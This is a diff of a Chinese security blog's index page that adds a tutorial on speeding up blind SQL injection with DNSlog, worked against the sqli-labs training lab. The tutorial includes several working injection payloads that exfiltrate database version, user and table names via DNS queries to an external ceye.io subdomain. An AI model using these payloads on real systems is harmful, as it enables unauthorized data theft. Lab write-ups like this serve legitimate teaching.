@@ -252,6 +252,169 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/30/dnslogsqli/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Lawliet">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/Ironman.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lawliet Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/06/30/dnslogsqli/" itemprop="url">渗透技巧:使用dnslog加快盲注速度</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-06-30T19:02:43+08:00">
+                2018-06-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="渗透技巧-使用dnslog加快盲注速度"><a href="#渗透技巧-使用dnslog加快盲注速度" class="headerlink" title="渗透技巧:使用dnslog加快盲注速度"></a>渗透技巧:使用dnslog加快盲注速度</h1><p><strong>sql盲注分为基于bool的盲注和基于时间的盲注，大家都知道，盲注是在页面没有显示位并且没有报错信息的时候，通过构造payload使页面返回的内容不同或者是页面响应的时间不同从而去判断出数据库中的数据，不管是bool盲注还是时间盲注，在进行判断的时候都需要一个字符一个字符的去判断，虽然二分法可以加快盲注的速度，但是还有一种更好的办法，那就是使用dnslog，具体过程如下图</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180630/8aC6fb4hHB.png?imageslim" alt="mark"><br><strong>由上图可以看出要进行dnslog注入需要几个条件：</strong></p>
+<p><strong>1.web服务器操作系统必须为windows，因为UNC这个东西是windows特有的，关于UNC的解析如下</strong></p>
+<p><strong>UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。格式：<code>\\servername\sharename</code>，其中servername是服务器名。sharename是共享资源的名称。目录或文件的UNC名称可以包括共享名称下的目录路径，格式为：<code>\\servername\sharename\directory\filename</code></strong></p>
+<p><strong>2.以mysql为例，数据库的<code>load_file</code>函数必须可用，也就是数据库用户必须要有<code>file_priv</code>权限</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180630/Ai4HGl7IhG.png?imageslim" alt="mark"></p>
+<p><strong>其次就是mysql的<code>secure_file_priv</code>不为NULL,有些高版本的mysql中的<code>secure_file_priv</code>默认为NULL</strong></p>
+<p><strong><code>secure_file_priv</code>特性<code>secure_file_priv</code>参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。</strong></p>
+<pre><code>secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出。
+当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下。
+当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制。
+</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180630/96ilB0fDlj.png?imageslim" alt="mark"></p>
+<p><strong>配置方法，在mysql配置文件中[mysqld]里追加一条<code>secure_file_priv =</code></strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180630/mKDHhh4j1G.png?imageslim" alt="mark"></p>
+<p><strong>符合了上述的两个条件就可以使用dnslog去进行注入了，首先需要有一台自己的DNS服务器，该DNS服务器的作用是用来接收DNS查询日志，从日志中获取dnslog注入的结果，这里推荐使用知道创宇的<a href="http://ceye.io/" title="CEYE平台" target="_blank" rel="external">CEYE平台</a>，注册完成后会分配给用户一个该平台的二级域名，这个二级域名可以作为我们的DNS服务器</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180630/6A6EkBLkf7.png?imageslim" alt="mark"></p>
+<p><strong>以sqli-labs第九关为例，该关卡是一个时间盲注</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180630/FaFeEAk4Gh.png?imageslim" alt="mark"><br><strong>传统的时间盲注对网速有着一定的要求，还有就是需要一个一个字符的去判断并且会有一定的延时，效率比较低，这里使用dnslog注入来试一下</strong></p>
+<p><strong>读取数据库版本信息，payload：</strong></p>
+<pre><code>http://192.168.242.128/sqli-labs/Less-9/index.php?id=1&apos; union select load_file(concat(&apos;\\\\&apos;,version(),&apos;.meomna.ceye.io\\abc&apos;)),2,3%23
+</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180630/gACd593Dea.png?imageslim" alt="mark"><br><strong>可以在CEYE平台中的DNS Query中看到数据库版本信息</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180630/aGG44dKHFD.png?imageslim" alt="mark"><br><strong>注意在读取当前用户时，由于<code>root@localhost</code>里的@符号在url里面有别的含义，@符号前面的内容会被当成<code>login:password</code>的格式，所以在查询时要使用hex函数进行16进制编码，否则会查询不到，payload：</strong></p>
+<pre><code>http://192.168.242.128/sqli-labs/Less-9/index.php?id=1&apos; union select load_file(concat(&apos;\\\\&apos;,(select hex(user())),&apos;.meomna.ceye.io\\abc&apos;)),2,3%23
+</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180630/Kjh5C1FJKj.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180630/EH0dChH0IE.png?imageslim" alt="mark"><br><strong>之后进行16进行解码便能得到内容</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180630/9962c1bbmk.png?imageslim" alt="mark"><br><strong>读取当前的数据库</strong></p>
+<pre><code>http://192.168.242.128/sqli-labs/Less-9/index.php?id=1&apos; union select load_file(concat(&apos;\\\\&apos;,database(),&apos;.meomna.ceye.io\\abc&apos;)),2,3%23
+</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180630/3Bg8h43kcD.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180630/3hmLf064Jm.png?imageslim" alt="mark"><br><strong>读取当前数据库下的所有表，group_concat返回的查询结果中有<code>,</code>,所以要使用hex函数进行16进制编码，否则会查询不到</strong></p>
+<pre><code>http://192.168.242.128/sqli-labs/Less-9/index.php?id=1&apos; union select load_file(concat(&apos;\\\\&apos;,(select hex(group_concat(table_name)) from information_schema.tables where table_schema=database()),&apos;.meomna.ceye.io\\abc&apos;)),2,3%23
+</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180630/9j21maLE6F.png?imageslim" alt="mark"><br><strong>之后将得到的内容进行16进制解码就能获取到数据库内容了</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180630/AafjHEfmLj.png?imageslim" alt="mark"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/07/upload-labs/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -347,7 +510,7 @@
           <h1 id="upload-labs通关教程（持续更新）"><a href="#upload-labs通关教程（持续更新）" class="headerlink" title="upload-labs通关教程（持续更新）"></a>upload-labs通关教程（持续更新）</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>最近在圈子里看到的一个文件上传闯关靶场，一共有19关，趁着这个机会做一个教程，以下的内容只是自己的思路，绕过方法有很多种，欢迎大家一起交流，共同学习！</strong><br>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2018/06/07/upload-labs/#more" rel="contents">
+            <a class="btn" href="/2018/06/07/upload-labs/#espandi" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -493,7 +656,7 @@
           <h1 id="python布尔盲注脚本算法完善"><a href="#python布尔盲注脚本算法完善" class="headerlink" title="python布尔盲注脚本算法完善"></a>python布尔盲注脚本算法完善</h1><p><strong>完善一下上次写的python盲注工具，之前那个盲注工具在猜取字符的时候使用的二分法，通过查找<code>0-126</code>这个范围去采取数据库中的数据。但是当时遗留了一个问题，就是在逐个猜解数据库字符时使用二分法并没有什么问题，这时因为字符都在<code>0-126</code>这个固定范围内，但是在猜取数据库个数、指定数据库的表个数、字段个数或者表中记录条数时，又或者是数据库名的长度、表名长度、字段名的长度时是没有一个固定的范围的，举个例子，比如在猜取表中记录个数时，记录的个数是不能确定范围的，也就是不能确定二分法的最大值，当时采用了循环自加的方式去判断，速度自然是慢了许多。今天抽时间读了一下sqlmap的payload，通过payload发现sqlmap也考虑到了这种情况，并且处理方法还是不错的。对于这种情况还是可以通过二分法判断的，将自己的方法记录一下~</strong><br>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2018/06/06/pyblindsqlimax/#more" rel="contents">
+            <a class="btn" href="/2018/06/06/pyblindsqlimax/#espandi" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -639,7 +802,7 @@
           <h1 id="python编程实现自动化注入之布尔盲注"><a href="#python编程实现自动化注入之布尔盲注" class="headerlink" title="python编程实现自动化注入之布尔盲注"></a>python编程实现自动化注入之布尔盲注</h1><p><strong>python编程实现自动化注入这个话题很有可能会写成一个系列，主要希望通过编写自动化注入工具脚本来提高自己的python代码能力和sql注入的能力，mysql数据库常见的注入分为union注入，报错注入，布尔盲注和时间盲注，这篇文章先用布尔盲注工具的编写来开个头~主要会用到optparse库去解析命令行参数，同时会用到二分有序查找算法去猜解数据库的每个字符，optparse库的用法和二分法的好处在之前的文章里都写的很清楚了，开始编写吧</strong><br>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2018/06/05/pyblindsqli/#more" rel="contents">
+            <a class="btn" href="/2018/06/05/pyblindsqli/#espandi" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -785,7 +948,7 @@
           <h1 id="python-optparse模块使用总结"><a href="#python-optparse模块使用总结" class="headerlink" title="python optparse模块使用总结"></a>python optparse模块使用总结</h1><p><strong>之前用过的一个python库，可以实现解析命令行参数实现命令行交互，最近再写自动化sql注入工具需要实现命令行交互的功能，由于好久不写，可多细节方面都想不起来了，又重新温习了一下这个库，在这里记录一下使用方法和一些容易被忽视的细节</strong><br>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2018/06/05/pyoptparse/#more" rel="contents">
+            <a class="btn" href="/2018/06/05/pyoptparse/#espandi" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -932,7 +1095,7 @@
 <p><strong>记录一个用python写SQL盲注脚本时需要用到的一个算法，在使用盲注的技术去判断数据库的内容时，使用二分法可以加快查找速度，相比于自加的判断可以减少所发送的http请求</strong><br>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2018/06/04/pybinarysearch/#more" rel="contents">
+            <a class="btn" href="/2018/06/04/pybinarysearch/#espandi" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1078,7 +1241,7 @@
           <h1 id="burpsuite中配置使用sqlmapapi"><a href="#burpsuite中配置使用sqlmapapi" class="headerlink" title="burpsuite中配置使用sqlmapapi"></a>burpsuite中配置使用sqlmapapi</h1><p><strong>burpsuite的Extender中有很多有用的扩展插件可以方便安全人员渗透测试，其中一个名为<code>SQLiPY</code>的插件可以直接在burpsuite中调用sqlmapapi进行测试，自己在安装这个插件的时候遇到了很多坑，属于那种百度谷歌都查不出解决方案的问题。最终终于捣腾出来了，在这记录一下</strong><br>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2018/06/03/BurpSQLiPY/#more" rel="contents">
+            <a class="btn" href="/2018/06/03/BurpSQLiPY/#espandi" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1225,7 +1388,7 @@
 <p><strong>之前使用赛风vpn时sqlmap的-g是可以用的，但是由于之后换成了shadowsocks后发现-g功能不能用了，百度谷歌都没有搜到这个问题的解决办法，将我的结果方案写到这里</strong><br>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2018/06/02/sqlmapgsearch/#more" rel="contents">
+            <a class="btn" href="/2018/06/02/sqlmapgsearch/#espandi" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1371,7 +1534,7 @@
           <h1 id="ISCC2018-write-up"><a href="#ISCC2018-write-up" class="headerlink" title="ISCC2018 write up"></a>ISCC2018 write up</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>参加2018年的ISCC竞赛，将做出的题记录到这里,记录一下思路，沉淀一下</strong><br>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2018/05/25/iscc2018/#more" rel="contents">
+            <a class="btn" href="/2018/05/25/iscc2018/#espandi" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1517,153 +1680,7 @@
           <h1 id="Apache安全加固"><a href="#Apache安全加固" class="headerlink" title="Apache安全加固"></a>Apache安全加固</h1><p><strong>这篇文章记录了针对apache几种安全问题所进行的安全加固手段，环境为Centos</strong><br>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2018/05/19/apache_security_config/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/17/autocheck/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Lawliet">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/Ironman.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Lawliet Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/05/17/autocheck/" itemprop="url">用shell实现对指定ip进行自动基线安全检查</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-17T23:14:50+08:00">
-                2018-05-17
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Linux-Shell/" itemprop="url" rel="index">
-                    <span itemprop="name">Linux Shell</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h1 id="用shell脚本实现对指定ip进行自动基线安全检查"><a href="#用shell脚本实现对指定ip进行自动基线安全检查" class="headerlink" title="用shell脚本实现对指定ip进行自动基线安全检查"></a>用shell脚本实现对指定ip进行自动基线安全检查</h1><p><strong>最近在学习shell脚本，一直再尝试用shell实现一些有意思的东西，该脚本实现了自动上传基线脚本到指定linux服务器上运行检查，并且将检查结果文件发送到我们的机器</strong><br>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2018/05/17/autocheck/#more" rel="contents">
+            <a class="btn" href="/2018/05/19/apache_security_config/#espandi" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1755,7 +1772,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">39</span>
+                  <span class="site-state-item-count">40</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
